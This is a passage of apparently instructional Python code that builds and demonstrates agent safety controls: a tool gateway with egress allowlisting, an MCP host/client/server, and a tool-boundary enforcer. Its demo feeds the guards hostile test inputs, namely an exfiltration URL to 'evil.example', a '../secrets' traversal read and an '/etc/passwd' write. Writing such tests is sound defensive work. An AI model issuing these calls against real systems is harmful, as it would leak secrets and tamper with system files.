                                terms=sorted(set(tokenize(doc.title + " " + text))), vec=embed(doc.title + " " + text))
                self.chunks[chunk.chunk_id] = chunk
                self.df.update(chunk.terms)
        return len(self.chunks)

    def _idf(self, term: str) -> float:
        return math.log(1 + len(self.chunks) / (1 + self.df.get(term, 0)))

    def search(self, query: str, k: int = 3) -> list[tuple[KBChunk, float]]:
        q_terms, q_vec = set(tokenize(query)), embed(query)
        total_idf = sum(self._idf(t) for t in q_terms) or 1.0
        scored = []
        for ch in self.chunks.values():
            keyword = sum(self._idf(t) for t in q_terms if t in ch.terms) / total_idf
            scored.append((ch, round(0.5 * max(0.0, cosine(q_vec, ch.vec)) + 0.5 * keyword, 4)))
        scored.sort(key=lambda p: p[1], reverse=True)
        return scored[:k]

    def answer(self, query: str) -> CitedAnswer:
        hits = [(c, s) for c, s in self.search(query, 2) if s >= self.min_score]
        if not hits:  # abstain rather than let the model improvise
            return CitedAnswer(answer="I could not find this in the knowledge base.", citations=[], grounded=False,
                               top_score=self.search(query, 1)[0][1] if self.chunks else 0.0)
        return CitedAnswer(answer=" ".join(f"{c.text} [{c.chunk_id}]" for c, _ in hits), citations=[c.chunk_id for c, _ in hits],
                           grounded=True, top_score=hits[0][1])

    def verify_citations(self, answer: CitedAnswer) -> bool:
        cited = set(re.findall(r"\[([A-Za-z0-9_-]+#\d+)\]", answer.answer))
        return cited == set(answer.citations) and all(c in self.chunks for c in cited)


# ---- Syllabus extension: connecting agents to external tools safely ---
class HttpGetArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    url: str


class CreateTicketArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    title: str = Field(min_length=3, max_length=80)
    body: str = Field(max_length=500)


class NoArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")


@dataclass(frozen=True)
class ToolSpec:
    name: str
    args_model: type[BaseModel]
    handler: Callable[[Any], Awaitable[Any]]
    write: bool = False
    rate_per_min: int = 30
    timeout_s: float = 0.5
    egress_hosts: frozenset[str] = frozenset()


Confirm = Callable[[str, str, dict[str, Any]], Awaitable[bool]]


class SafeToolGateway:
    """Every model-proposed call passes: allowlist -> schema -> egress -> rate limit -> confirmation -> timeout."""

    def __init__(self, specs: list[ToolSpec], allowed: set[str], clock: Callable[[], float], confirm: Confirm) -> None:
        self.specs, self.allowed, self.clock, self.confirm = {s.name: s for s in specs}, allowed, clock, confirm
        self._calls: dict[tuple[str, str], list[float]] = {}
        self.audit: list[dict[str, Any]] = []

    def _deny(self, agent: str, tool: str, reason: str) -> None:
        self.audit.append({"agent": agent, "tool": tool, "outcome": "denied", "reason": reason})

    async def call(self, agent: str, tool: str, raw_args: dict[str, Any]) -> Any:
        if tool not in self.allowed or tool not in self.specs:
            self._deny(agent, tool, "not_allowlisted")
            raise ToolNotAllowedError(f"{tool!r} is not on the allowlist")
        spec = self.specs[tool]
        try:
            args = spec.args_model.model_validate(raw_args)
        except ValidationError as exc:
            self._deny(agent, tool, "bad_args")
            raise ToolArgumentError(f"{tool}: {exc.error_count()} invalid argument(s): {[e['loc'] for e in exc.errors()]}") from exc
        dumped = args.model_dump()
        if "url" in dumped:
            parsed = urlparse(dumped["url"])
            if parsed.scheme != "https" or parsed.hostname not in spec.egress_hosts:
                self._deny(agent, tool, "egress")
                raise EgressDeniedError(f"host {parsed.hostname!r} is not in the egress allowlist for {tool}")
        window = [t for t in self._calls.get((agent, tool), []) if self.clock() - t < 60]
        if len(window) >= spec.rate_per_min:
            self._deny(agent, tool, "rate_limit")
            raise RateLimitedError(tool, 60 - (self.clock() - window[0]))
        self._calls[(agent, tool)] = window + [self.clock()]
        if spec.write and not await self.confirm(agent, tool, dumped):
            self._deny(agent, tool, "confirmation_denied")
            raise ConfirmationDeniedError(f"human declined {tool}")
        attempts = 1 if spec.write else 3  # never auto-retry a write without an idempotency key

        async def run() -> Any:
            return await asyncio.wait_for(spec.handler(args), spec.timeout_s)

        try:
            result = await with_backoff(run, attempts=attempts, retry_on=(ToolTransientError,))
        except asyncio.TimeoutError as exc:
            self.audit.append({"agent": agent, "tool": tool, "outcome": "error", "reason": "timeout"})
            raise ToolTimeoutError(f"{tool} exceeded {spec.timeout_s}s") from exc
        self.audit.append({"agent": agent, "tool": tool, "outcome": "ok", "args": sorted(dumped)})
        return result


def build_gateway(clock: FakeClock, confirm: Confirm) -> SafeToolGateway:
    flaky = {"n": 0}

    async def http_get(a: HttpGetArgs) -> str:
        flaky["n"] += 1
        if flaky["n"] == 1:
            raise ToolTransientError("upstream 502")
        return f"200 OK from {urlparse(a.url).hostname}"

    async def create_ticket(a: CreateTicketArgs) -> str:
        return f"ticket created: {a.title}"

    async def slow(a: NoArgs) -> str:
        await asyncio.sleep(1.0)
        return "never returned"

    specs = [ToolSpec("http_get", HttpGetArgs, http_get, rate_per_min=3, egress_hosts=frozenset({"api.internal.example"})),
             ToolSpec("create_ticket", CreateTicketArgs, create_ticket, write=True),
             ToolSpec("slow_report", NoArgs, slow, timeout_s=0.02)]
    return SafeToolGateway(specs, {"http_get", "create_ticket", "slow_report"}, clock, confirm)  # delete_account: absent on purpose


# ---- Syllabus extension: MCP Host / Client / Server architecture ---
SUPPORTED_VERSIONS = ["2025-03-26", "2024-11-05"]  # newest first


class JsonRpcRequest(BaseModel):
    jsonrpc: Literal["2.0"]
    id: int | None = None  # no id = notification (fire-and-forget)
    method: str
    params: dict[str, Any] = Field(default_factory=dict)


def rpc_result(req_id: int, result: dict[str, Any]) -> dict[str, Any]:
    return {"jsonrpc": "2.0", "id": req_id, "result": result}


def rpc_error(req_id: int | None, code: int, message: str) -> dict[str, Any]:
    return {"jsonrpc": "2.0", "id": req_id, "error": {"code": code, "message": message}}


McpHandler = Callable[[dict[str, Any]], Awaitable[str]]


class McpServer:
    """Exposes tools (or only resources) over JSON-RPC. Knows nothing about models, hosts or other servers."""

    def __init__(self, name: str, tools: dict[str, tuple[dict[str, Any], McpHandler]] | None = None, cold_starts: int = 0) -> None:
        self.name, self.tools, self.cold_starts, self.initialized = name, tools or {}, cold_starts, False
        self.capabilities: dict[str, Any] = {"tools": {"listChanged": False}} if self.tools else {"resources": {}}

    async def handle(self, raw: dict[str, Any]) -> dict[str, Any] | None:
        try:
            req = JsonRpcRequest.model_validate(raw)
        except ValidationError:
            return rpc_error(raw.get("id") if isinstance(raw.get("id"), int) else None, -32600, "invalid request")
        if req.id is None:
            if req.method == "notifications/initialized":
                self.initialized = True
            return None
        if req.method == "initialize":
            if self.cold_starts > 0:
                self.cold_starts -= 1
                return rpc_error(req.id, -32000, "server starting")
            wanted = req.params.get("protocolVersion")
            version = wanted if wanted in SUPPORTED_VERSIONS else SUPPORTED_VERSIONS[0]
            return rpc_result(req.id, {"protocolVersion": version, "capabilities": self.capabilities,
                                       "serverInfo": {"name": self.name, "version": "1.0.0"}})
        if req.method == "ping":
            return rpc_result(req.id, {})
        if req.method == "tools/list" and "tools" in self.capabilities:
            return rpc_result(req.id, {"tools": [{"name": n, **meta} for n, (meta, _) in self.tools.items()]})
        if req.method == "tools/call" and "tools" in self.capabilities:
            name = req.params.get("name", "")
            if name not in self.tools:
                return rpc_error(req.id, -32602, f"unknown tool {name!r}")
            try:
                text, is_error = await self.tools[name][1](req.params.get("arguments", {})), False
            except (KeyError, ValueError) as exc:  # tool-level failures are results with isError, not protocol errors
                text, is_error = f"tool failed: {exc}", True
            return rpc_result(req.id, {"content": [{"type": "text", "text": text}], "isError": is_error})
        return rpc_error(req.id, -32601, f"method {req.method!r} not found")


class InProcessTransport:
    """Stands in for stdio / HTTP: a message pipe to ONE server with a recorded wire log."""

    def __init__(self, server: McpServer, wire: list[str]) -> None:
        self.server, self.wire = server, wire
        self._inbox: asyncio.Queue[dict[str, Any] | None] = asyncio.Queue()
        self._pending: dict[int, asyncio.Future[dict[str, Any]]] = {}
        self._task: asyncio.Task[None] | None = None

    async def start(self) -> None:
        self._task = asyncio.create_task(self._serve())

    async def _serve(self) -> None:
        while True:
            msg = await self._inbox.get()
            if msg is None:
                return
            resp = await self.server.handle(msg)
            if resp is not None and isinstance(resp.get("id"), int) and resp["id"] in self._pending:
                kind = "error" if "error" in resp else "result"
                self.wire.append(f"{self.server.name} -> client  #{resp['id']} {kind}")
                self._pending.pop(resp["id"]).set_result(resp)

    async def request(self, msg: dict[str, Any], timeout_s: float = 1.0) -> dict[str, Any]:
        fut: asyncio.Future[dict[str, Any]] = asyncio.get_running_loop().create_future()
        self._pending[msg["id"]] = fut
        self.wire.append(f"client -> {self.server.name}  #{msg['id']} {msg['method']}")
        await self._inbox.put(msg)
        try:
            return await asyncio.wait_for(fut, timeout_s)
        except asyncio.TimeoutError as exc:
            self._pending.pop(msg["id"], None)
            raise TransportTimeoutError(f"{self.server.name}: no reply to {msg['method']}") from exc

    async def notify(self, msg: dict[str, Any]) -> None:
        self.wire.append(f"client -> {self.server.name}  notify {msg['method']}")
        await self._inbox.put(msg)

    async def close(self) -> None:
        await self._inbox.put(None)
        if self._task:
            await self._task


class McpClient:
    """One client per server (1:1). Owns the session: version/capability negotiation and request ids."""

    def __init__(self, name: str, transport: InProcessTransport) -> None:
        self.name, self.transport, self._next_id = name, transport, 1
        self.server_caps: dict[str, Any] = {}
        self.protocol = ""

    async def _rpc(self, method: str, params: dict[str, Any] | None = None) -> dict[str, Any]:
        req_id, self._next_id = self._next_id, self._next_id + 1
        resp = await self.transport.request({"jsonrpc": "2.0", "id": req_id, "method": method, "params": params or {}})
        if "error" in resp:
            err = resp["error"]
            raise (McpServerBusyError if err["code"] == -32000 else McpError)(err["code"], err["message"])
        return resp["result"]

    async def initialize(self) -> None:
        params = {"protocolVersion": SUPPORTED_VERSIONS[0], "capabilities": {}, "clientInfo": {"name": "lab10-host", "version": "1.0.0"}}
        result = await with_backoff(partial(self._rpc, "initialize", params), retry_on=(McpServerBusyError,))
        if result["protocolVersion"] not in SUPPORTED_VERSIONS:
            raise McpError(-32602, f"server picked unsupported protocol {result['protocolVersion']}")
        self.protocol, self.server_caps = result["protocolVersion"], result["capabilities"]
        await self.transport.notify({"jsonrpc": "2.0", "method": "notifications/initialized"})

    async def list_tools(self) -> list[dict[str, Any]]:
        if "tools" not in self.server_caps:
            raise CapabilityNotNegotiatedError(f"{self.name} did not advertise the tools capability")
        return (await self._rpc("tools/list"))["tools"]

    async def call_tool(self, name: str, arguments: dict[str, Any]) -> dict[str, Any]:
        return await self._rpc("tools/call", {"name": name, "arguments": arguments})


class McpHost:
    """The application process. Owns policy: which servers connect, which tools the model sees, who consents."""

    def __init__(self, allowed_tools: set[str], consent: Callable[[str, dict[str, Any]], Awaitable[bool]], wire: list[str]) -> None:
        self.allowed_tools, self.consent, self.wire = allowed_tools, consent, wire
        self.clients: dict[str, McpClient] = {}
        self._meta: dict[str, dict[str, Any]] = {}

    async def connect(self, server: McpServer) -> McpClient:
        if server.name in self.clients:
            raise McpError(-32600, f"a client for {server.name!r} already exists (1:1 binding)")
        transport = InProcessTransport(server, self.wire)
        await transport.start()
        client = McpClient(server.name, transport)
        await client.initialize()
        self.clients[server.name] = client
        return client

    async def catalog(self) -> list[str]:
        """Aggregate tools from every client that negotiated the tools capability, namespaced server.tool."""
        names: list[str] = []
        for cname, client in self.clients.items():
            try:
                tools = await client.list_tools()
            except CapabilityNotNegotiatedError:
                continue
            for t in tools:
                q = f"{cname}.{t['name']}"
                self._meta[q] = t
                if q in self.allowed_tools:  # host policy decides what the model may even see
                    names.append(q)
        return names

    async def call(self, qualified: str, arguments: dict[str, Any]) -> str:
        if qualified not in self.allowed_tools or qualified not in self._meta:
            raise ToolNotAllowedError(f"{qualified!r} is not exposed by this host")
        server, tool = qualified.split(".", 1)
        read_only = bool(self._meta[qualified].get("annotations", {}).get("readOnlyHint"))
        if not read_only and not await self.consent(qualified, arguments):
            raise ConfirmationDeniedError(f"user declined {qualified}")
        result = await self.clients[server].call_tool(tool, arguments)
        text = "".join(c["text"] for c in result["content"] if c["type"] == "text")
        return f"ERROR: {text}" if result["isError"] else text

    async def close(self) -> None:
        for client in self.clients.values():
            await client.transport.close()


def build_mcp_servers() -> list[McpServer]:
    fs = {"/docs/readme.txt": "hello from the files server"}

    async def read_file(a: dict[str, Any]) -> str:
        path = str(a["path"])
        if ".." in path:
            raise ValueError("path traversal rejected")
        return fs[path]

    async def write_file(a: dict[str, Any]) -> str:
        fs[str(a["path"])] = str(a["content"])
        return f"wrote {len(str(a['content']))} bytes"

    files = McpServer("files", {
        "read_file": ({"description": "Read a text file", "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}, "required": ["path"]},
                       "annotations": {"readOnlyHint": True}}, read_file),
        "write_file": ({"description": "Write a text file", "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}, "required": ["path", "content"]},
                        "annotations": {"readOnlyHint": False}}, write_file),
    }, cold_starts=1)
    notes = McpServer("notes")  # resources-only: never advertises tools
    return [files, notes]


# ---- Syllabus extension: standardized tool access boundaries ---
class Classification(IntEnum):
    PUBLIC = 0
    INTERNAL = 1
    CONFIDENTIAL = 2
    RESTRICTED = 3


class ManifestEntry(BaseModel):
    tool: str
    boundary: str  # trust zone the tool lives in
    scopes: frozenset[str]  # caller must hold ALL of these
    data_classification: Classification
    write: bool = False


class ToolManifest(BaseModel):
    version: str
    tools: list[ManifestEntry]

    def digest(self) -> str:
        """Pin the manifest: a changed tool definition (scope, classification) changes the digest."""
        body = [[e.tool, e.boundary, sorted(e.scopes), int(e.data_classification), e.write] for e in self.tools]
        return hashlib.sha256(json.dumps([self.version, body]).encode()).hexdigest()[:16]


class Principal(BaseModel):
    agent_id: str
    boundary: str
    scopes: frozenset[str]
    clearance: Classification


MANIFEST_JSON = """{
  "version": "2025-01",
  "tools": [
    {"tool": "kb.search", "boundary": "support", "scopes": ["kb:read"], "data_classification": 1},
    {"tool": "crm.get_customer", "boundary": "support", "scopes": ["crm:read"], "data_classification": 2},
    {"tool": "crm.update_customer", "boundary": "support", "scopes": ["crm:read", "crm:write"], "data_classification": 2, "write": true},
    {"tool": "payments.refund", "boundary": "finance", "scopes": ["payments:write"], "data_classification": 3, "write": true},
    {"tool": "web.fetch_public", "boundary": "edge", "scopes": [], "data_classification": 0}
  ]
}"""


class BoundaryEnforcer:
    """Deny-by-default gate in front of tool execution; every decision (allow or deny) is audited."""

    def __init__(self, manifest: ToolManifest, bridges: set[tuple[str, str]] | None = None) -> None:
        self.entries = {e.tool: e for e in manifest.tools}
        self.bridges = bridges or set()  # explicitly approved (from_boundary, to_boundary) pairs
        self.audit: list[dict[str, Any]] = []

    def visible_tools(self, p: Principal) -> list[str]:
        """Discovery is filtered too: the model never even sees tools it could not call."""
        names = []
        for name in self.entries:
            try:
                self.check(p, name, record=False)
                names.append(name)
            except BoundaryViolationError:
                continue
        return names

    def check(self, p: Principal, tool: str, record: bool = True) -> ManifestEntry:
        entry = self.entries.get(tool)
        outcome, err = "allow", None
        if entry is None:
            outcome, err = "deny:unknown_tool", BoundaryViolationError(f"{tool!r} is not in the manifest")
        elif entry.boundary != p.boundary and (p.boundary, entry.boundary) not in self.bridges:
            outcome, err = "deny:cross_boundary", CrossBoundaryError(f"{p.agent_id} in {p.boundary!r} cannot reach {entry.boundary!r}")
        elif not entry.scopes <= p.scopes:
            outcome, err = "deny:missing_scope", MissingScopeError(f"missing scopes {sorted(entry.scopes - p.scopes)}")
        elif entry.data_classification > p.clearance:
            outcome, err = "deny:clearance", ClearanceError(f"{entry.data_classification.name} data above clearance {p.clearance.name}")
        if record:
            self.audit.append({"agent": p.agent_id, "tool": tool, "outcome": outcome})
        if err is not None:
            raise err
        assert entry is not None
        return entry


async def extension_demo() -> None:
    clock = FakeClock()

    # 1,3,4 checkpoint history, time travel, interrupt, manual approval with edit-before-resume
    store = CheckpointStore(fail_puts=2)  # first two writes fail: backoff retries hide it from the runner
    ledger: list[str] = []
    runner = build_refund_runner(store, ledger)
    first = await runner.run("refund-1", {"case_id": "c1", "requested_amount": 900})
    log.info("interrupt", extra={"ctx": {"status": first.status, "paused_before": first.next_node, "store_put_attempts": store.put_attempts,
                                         "effects_so_far": list(ledger)}})
    try:
        await runner.run("refund-1", resume=ResumeCommand(approver="analyst-7", approve=True, justification="ok", edits={"customer": "c-99"}))
    except ForbiddenEditError as exc:
        log.info("edit guard", extra={"ctx": {"error": str(exc)}})
    try:
        await runner.run("refund-1", resume=ResumeCommand(approver="analyst-7", approve=True, justification=" "))
    except ApprovalRequiredError as exc:
        log.info("justification guard", extra={"ctx": {"error": str(exc)}})
    done = await runner.run("refund-1", resume=ResumeCommand(approver="analyst-7", approve=True, justification="partial refund per policy",
                                                              edits={"refund_amount": 450}))
    log.info("resumed", extra={"ctx": {"status": done.status, "receipt": done.values["receipt"], "ledger": list(ledger)}})
    hist = await store.history("refund-1")
    log.info("history", extra={"ctx": {"steps": [(c.step, c.next_node, bool(c.pending_approval)) for c in hist]}})
    await runner.fork("refund-1", 1, "refund-1-replay", {"requested_amount": 100})
    paused = await runner.run("refund-1-replay")
    replay = await runner.run("refund-1-replay", resume=ResumeCommand(approver="analyst-7", approve=True, justification="replay what-if"))
    forked = await store.latest("refund-1-replay")
    log.info("time travel", extra={"ctx": {"forked_from": forked.forked_from if forked else None, "paused": paused.status,
                                           "replay_receipt": replay.values["receipt"], "original_receipt": done.values["receipt"]}})
    try:
        await runner.run("refund-2", {"case_id": "c2", "requested_amount": 50})
        await runner.run("refund-2", resume=ResumeCommand(approver="analyst-7", approve=False, justification="suspicious"))
    except ApprovalRejectedError as exc:
        log.info("rejected", extra={"ctx": {"error": str(exc), "audit": runner.audit[-1]}})

    # 2 semantic long-term memory
    mem = LongTermMemory(clock)
    ana, bo = mem.namespace_for("ana"), mem.namespace_for("bo")
    await mem.remember(ana, "Ana prefers aisle seats on long flights", 0.8)
    await mem.remember(ana, "Ana's company is based in Lisbon", 0.6)
    await mem.remember(ana, "Ana mentioned the weather was rainy today", 0.1)
    await mem.remember(bo, "Bo prefers window seats", 0.8)
    clock.advance(90 * 86400)
    await mem.remember(ana, "Ana now travels with a guide dog", 0.9)
    await mem.remember(ana, "Ana switched to window seats on flights last week", 0.5)
    hits = await mem.recall(ana, "which seat does Ana like on a flight", k=2)
    log.info("memory recall", extra={"ctx": {"top": [(h.text, h.score, h.similarity, h.recency) for h in hits],
                                             "other_user_leak": any("Bo" in h.text for h in hits)}})
    log.info("memory forget", extra={"ctx": {"forgotten": await mem.forget(ana), "namespace": ana, "remaining_bo": len(await mem.recall(bo, "seats"))}})
    try:
        await mem.recall("shared", "anything")
    except MemoryNamespaceError as exc:
        log.info("namespace guard", extra={"ctx": {"error": str(exc)}})

    # 5 infinite ReAct loop detection with escalation
    async def search(q: str) -> str:
        return {"refund policy": "see policy page", "policy page": "refund policy"}.get(q, f"result for {q}")

    queue = ApprovalQueue()
    stuck: Policy = lambda h: ("search", "refund policy")
    pingpong: Policy = lambda h: ("search", "refund policy" if len(h) % 2 == 0 else "policy page")
    novel: Policy = lambda h: ("search", f"query {len(h)}") if len(h) < 3 else None
    for label, policy, case in (("stuck", stuck, "loop-1"), ("ping-pong", pingpong, "loop-2"), ("healthy", novel, "loop-3")):
        try:
            trace = await guarded_react(policy, {"search": search}, LoopDetector(), queue, case)
            log.info("react ok", extra={"ctx": {"policy": label, "steps": len(trace)}})
        except LoopDetectedError as exc:
            log.info("loop detected", extra={"ctx": {"policy": label, "kind": exc.kind, "detail": exc.detail}})
    try:
        await guarded_react(lambda h: ("search", f"unique {len(h)}"), {"search": search}, LoopDetector(token_budget=1500), queue, "loop-4")
    except LoopDetectedError as exc:
        log.info("budget loop", extra={"ctx": {"kind": exc.kind, "detail": exc.detail, "escalations": sorted(queue.pending)}})

    # 6 self-correction
    prompts: list[str] = []
    rubric = "cites a figure; names an owner; under 40 words"
    gen = scripted_text_fn(["Churn rose.", "Churn rose 4% in Q3.", "Churn rose 4% in Q3; owner: CS Ops."], prompts)
    crit = scripted_text_fn(['{"score": 3, "issues": ["no figure", "no owner"]}', '{"score": 6, "issues": ["no owner"]}',
                             '{"score": 9, "issues": []}'], prompts)
    r1 = await self_correct("Summarise Q3 churn", rubric, gen, crit)
    log.info("self-correct accepted", extra={"ctx": r1.model_dump()})
    gen2 = scripted_text_fn(["v1", "v2", "v3"], prompts)
    crit2 = scripted_text_fn(['{"score": 6, "issues": ["thin"]}', '{"score": 6, "issues": ["thin"]}', '{"score": 7, "issues": []}'], prompts)
    r2 = await self_correct("t", rubric, gen2, crit2)
    log.info("self-correct plateau", extra={"ctx": r2.model_dump()})
    gen3 = scripted_text_fn(["good", "worse"], prompts)
    crit3 = scripted_text_fn(['{"score": 6, "issues": ["x"]}', '{"score": 4, "issues": ["y"]}'], prompts)
    r3 = await self_correct("t", rubric, gen3, crit3)
    log.info("self-correct regression", extra={"ctx": {"returned": r3.answer, "stop": r3.stop_reason, "scores": r3.scores}})
    try:
        await self_correct("t", rubric, scripted_text_fn(["a"], prompts), scripted_text_fn(["not json"], prompts))
    except CriticFormatError as exc:
        log.info("critic format guard", extra={"ctx": {"error": str(exc)}})
    log.info("reflection prompt sample", extra={"ctx": {"prompt": next(p for p in prompts if p.startswith("TASK:"))}})

    # 7 managed agent provisioning
    plane = ControlPlane(clock, admins={"platform-bot", "priya"})
    spec = AgentSpec(name="refund-agent", team="support", model="small-fast", tools=["get_order", "issue_refund"], secrets_scope="refunds:write")
    v1 = await plane.create(spec, "priya")
    bad = spec.model_copy(update={"name": "rogue", "model": "unreviewed-model", "tools": ["delete_all"], "max_tokens_per_run": 900_000, "secrets_scope": "crm:read"})
    try:
        await plane.create(bad, "priya")
    except PolicyViolationError as exc:
        log.info("policy rejected", extra={"ctx": {"problems": exc.problems}})
    v2 = await plane.update("refund-agent", {"max_usd_per_day": 20.0}, "priya", expected_version=1)
    try:
        await plane.update("refund-agent", {"model": "large-reasoning"}, "platform-bot", expected_version=1)
    except VersionConflictError as exc:
        log.info("stale update", extra={"ctx": {"error": str(exc)}})
    try:
        await plane.create(spec.model_copy(update={"name": "x"}), "intern")
    except PolicyViolationError as exc:
        log.info("not admin", extra={"ctx": {"error": str(exc)}})
    lease = await plane.provision("refund-agent")
    await plane.retire("refund-agent", "priya")
    try:
        await plane.provision("refund-agent")
    except AgentRetiredError as exc:
        log.info("provisioning", extra={"ctx": {"lease": lease.model_dump(), "versions": plane.history("refund-agent"), "after_retire": str(exc),
                                                "v1_budget": v1.max_usd_per_day, "v2_budget": v2.max_usd_per_day}})

    # 8 knowledge base with citations
    docs = [KBDocument(doc_id="KB-1", title="Refund policy", text="Refunds under $500 are issued automatically. Refunds over $500 require manager approval. Approvals are logged."),
            KBDocument(doc_id="KB-2", title="Shipping times", text="Standard shipping takes 3 to 5 business days. Express shipping takes 1 to 2 business days."),
            KBDocument(doc_id="KB-3", title="Data retention", text="Customer chat transcripts are kept for 13 months. After that they are deleted automatically.")]
    kb = KnowledgeBase()
    count = await kb.ingest(DocSource(docs, flaky_id="KB-2"), ["KB-1", "KB-2", "KB-3"])
    for q in ("when do refunds need manager approval", "how long is express shipping", "who won the football game"):
        ans = kb.answer(q)
        log.info("kb answer", extra={"ctx": {"question": q, "answer": ans.answer, "citations": ans.citations, "grounded": ans.grounded,
                                             "top_score": ans.top_score, "citations_valid": kb.verify_citations(ans), "chunks": count}})

    # 9 safe external tool connection
    async def confirm(agent: str, tool: str, args: dict[str, Any]) -> bool:
        return args.get("title", "") != "wipe everything"

    gw = build_gateway(clock, confirm)
    attempts: list[tuple[str, str, dict[str, Any]]] = [
        ("http_get", "fetch", {"url": "https://api.internal.example/orders/1"}),
        ("http_get", "egress", {"url": "https://evil.example/exfil?d=secret"}),
        ("http_get", "extra field", {"url": "https://api.internal.example/x", "headers": "x"}),
        ("create_ticket", "ok write", {"title": "Printer jam", "body": "Floor 3"}),
        ("create_ticket", "declined", {"title": "wipe everything", "body": "now"}),
        ("create_ticket", "short title", {"title": "x", "body": "b"}),
        ("delete_account", "not allowlisted", {"id": "1"}),
        ("slow_report", "timeout", {}),
    ]
    for tool, label, args in attempts:
        try:
            out = await gw.call("agent-9", tool, args)
            log.info("gateway ok", extra={"ctx": {"case": label, "result": out}})
        except ToolGatewayError as exc:
            log.info("gateway blocked", extra={"ctx": {"case": label, "error_type": type(exc).__name__, "error": str(exc)}})
    for _ in range(3):
        try:
            await gw.call("agent-9", "http_get", {"url": "https://api.internal.example/orders/2"})
        except RateLimitedError as exc:
            log.info("gateway blocked", extra={"ctx": {"case": "rate limit", "error_type": "RateLimitedError", "retry_after_s": round(exc.retry_after_s, 1)}})
    log.info("gateway audit", extra={"ctx": {"outcomes": [(a["tool"], a["outcome"], a.get("reason", "")) for a in gw.audit]}})

    # 10 MCP host / client / server
    wire: list[str] = []

    async def consent(tool: str, args: dict[str, Any]) -> bool:
        return not str(args.get("path", "")).startswith("/etc")

    host = McpHost({"files.read_file", "files.write_file"}, consent, wire)
    for server in build_mcp_servers():
        client = await host.connect(server)
        log.info("mcp connected", extra={"ctx": {"server": server.name, "protocol": client.protocol, "capabilities": sorted(client.server_caps)}})
    cat = await host.catalog()
    outputs = [await host.call("files.read_file", {"path": "/docs/readme.txt"}),
               await host.call("files.write_file", {"path": "/docs/new.txt", "content": "abc"}),
               await host.call("files.read_file", {"path": "../secrets"})]
    log.info("mcp host", extra={"ctx": {"catalog": cat, "outputs": outputs}})
    for label, coro in (("denied consent", host.call("files.write_file", {"path": "/etc/passwd", "content": "x"})),
                        ("not exposed", host.call("notes.anything", {})),
                        ("duplicate client", host.connect(McpServer("files")))):
        try:
            await coro
        except (ConfirmationDeniedError, ToolNotAllowedError, McpError) as exc:
            log.info("mcp blocked", extra={"ctx": {"case": label, "error": str(exc)}})
    try:
        await host.clients["notes"].list_tools()
    except CapabilityNotNegotiatedError as exc:
        log.info("capability guard", extra={"ctx": {"error": str(exc)}})
    log.info("mcp wire log", extra={"ctx": {"messages": wire[:14], "total": len(wire)}})
    await host.close()

    # 11 standardized tool access boundaries
    manifest = ToolManifest.model_validate_json(MANIFEST_JSON)
    enforcer = BoundaryEnforcer(manifest, bridges={("support", "edge")})
    agent = Principal(agent_id="support-bot", boundary="support", scopes=frozenset({"kb:read", "crm:read"}), clearance=Classification.CONFIDENTIAL)
    log.info("manifest", extra={"ctx": {"digest": manifest.digest(), "visible": enforcer.visible_tools(agent)}})
    for tool in ("kb.search", "crm.get_customer", "crm.update_customer", "payments.refund", "web.fetch_public", "kb.drop_index"):
        try:
            enforcer.check(agent, tool)
        except BoundaryViolationError as exc:
            log.info("boundary denied", extra={"ctx": {"tool": tool, "error_type": type(exc).__name__, "error": str(exc)}})
    low = agent.model_copy(update={"agent_id": "intern-bot", "clearance": Classification.INTERNAL})
    try:
        enforcer.check(low, "crm.get_customer")
    except ClearanceError as exc:
        log.info("boundary denied", extra={"ctx": {"tool": "crm.get_customer", "error_type": "ClearanceError", "error": str(exc)}})
    tampered = manifest.model_copy(deep=True)
    tampered.tools[1] = tampered.tools[1].model_copy(update={"data_classification": Classification.PUBLIC})
    log.info("manifest drift", extra={"ctx": {"pinned": manifest.digest(), "tampered": tampered.digest(), "detected": manifest.digest() != tampered.digest()}})
    log.info("boundary audit", extra={"ctx": {"decisions": [(a["agent"], a["tool"], a["outcome"]) for a in enforcer.audit]}})


async def main() -> None:
    queue = ApprovalQueue()
    sup = Supervisor([make_scorer("scorer-a", 0.0, flaky=True), make_scorer("scorer-b", 0.1), make_scorer("scorer-c", -0.05)], queue)
    cases = [Case(case_id="c1", amount=120, text="coffee subscription"),
             Case(case_id="c2", amount=900, text="urgent wire to new beneficiary"),
             Case(case_id="c3", amount=700, text="equipment purchase, repeat vendor")]
    for c in cases:
        await sup.handle(c, Budget(tokens=5000))
    try:
        await sup.handle(cases[0], Budget(tokens=500))
    except BudgetExceededError as exc:
        log.info("budget guard", extra={"ctx": {"error": str(exc)}})
    for case_id in list(queue.pending):
        try:
            await queue.decide(case_id, "analyst-7", True, "")
        except OrchestrationError as exc:
            log.info("justification required", extra={"ctx": {"case": case_id, "error": str(exc)}})
        await queue.decide(case_id, "analyst-7", True, "verified beneficiary by phone callback")
    log.info("audit", extra={"ctx": {"events": queue.audit}})
    try:
        consensus([Vote(voter="x", verdict="ok", confidence=0.9)])
    except QuorumNotReachedError as exc:
        log.info("quorum guard", extra={"ctx": {"error": str(exc)}})

    await extension_demo()


if __name__ == "__main__":
    asyncio.run(main())
